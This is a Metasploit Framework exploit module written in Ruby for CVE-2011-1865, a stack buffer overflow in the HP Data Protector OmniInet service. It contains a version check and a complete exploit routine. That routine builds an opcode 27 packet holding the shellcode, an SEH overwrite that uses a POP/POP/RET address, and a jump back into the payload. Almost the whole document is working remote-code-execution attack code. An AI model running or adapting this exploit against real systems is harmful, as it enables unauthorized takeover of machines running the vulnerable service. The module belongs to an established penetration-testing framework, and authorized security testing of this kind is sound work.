##
# $Id: hp_omniinet_3.rb 13081 2011-07-01 22:26:12Z sinn3r $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'HP OmniInet.exe Opcode 27 Buffer Overflow',
			'Description'    => %q{
					This module exploits a  buffer overflow in the Hewlett-Packard
				OmniInet NT Service. By sending a specially crafted opcode 27 packet,
				a remote attacker may be able to execute arbitrary code.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 13081 $',
			'References'     =>
				[
					[ 'CVE', '2011-1865' ],
					[ 'URL', 'http://www.coresecurity.com/content/HP-Data-Protector-multiple-vulnerabilities' ],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'seh',
				},
			'Payload' =>
				{
					'Space'    => 800,
					'BadChars' => "\x00",
					'StackAdjustment' => -3500
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'HP Data Protector A.06.10 Build 611 / A.06.11 Build 243',
						{
							#POP/POP/RET from OmniBack\bin\MSVCR71.dll
							'Ret' => 0x7c35630d
						}
					],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jun 29 2011'))

		register_options([Opt::RPORT(5555)], self.class)
	end

	def check

		connect
		sock.put(rand_text_alpha_upper(64))
		resp = sock.get_once(-1,5)
		disconnect

		if (resp)
			resp = resp.unpack('v*').pack('C*')
			print_status("Received response: " + resp)

			# extract version
			if (resp =~ /HP Data Protector/)
				version = resp.split[3]
			elsif (resp =~ /HP OpenView Storage Data Protector/)
				version = resp.split[5]
			elsif (resp =~ /HP StorageWorks Application Recovery Manager/)
				version = resp.split[5]
			else
				return Exploit::CheckCode::Detected
			end

			version = version.split('.')
			major = version[1].to_i
			minor = version[2].to_i
			if ((major < 6) or (major == 6 and minor < 11))
				return Exploit::CheckCode::Vulnerable
			end

			if ((major > 6) or (major == 6 and minor >= 11))
				return Exploit::CheckCode::Safe
			end

		end
		return Exploit::CheckCode::Safe

	end

	def exploit

		connect

		trigger = rand_text_alpha_upper(10000)
		trigger[4552, payload.encoded.length] = payload.encoded
		trigger[5352, 8] = generate_seh_record(target.ret) 
		trigger[5360, 5] = Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-788").encode_string

		opcode = "27"

		packet = Rex::Text.to_unicode("\x00")
		packet << "\x27\xca" #length
		packet << "\xff\xfe\x32"
		packet << "\x00\x00\x00"
		packet << Rex::Text.to_unicode("\x20\x61\x00") * 3
		packet << Rex::Text.to_unicode("\x20")
		packet << trigger
		packet << Rex::Text.to_unicode("\x00")
		packet << Rex::Text.to_unicode("\x20\x61\x00")
		packet << Rex::Text.to_unicode("\x20" + opcode + "\x00")
		packet << Rex::Text.to_unicode("\x20\x61\x00") * 24 

		print_status("Trying #{target.name}...")
		sock.put(packet)
		
		select(nil,nil,nil,10)
		handler
		disconnect

	end

end
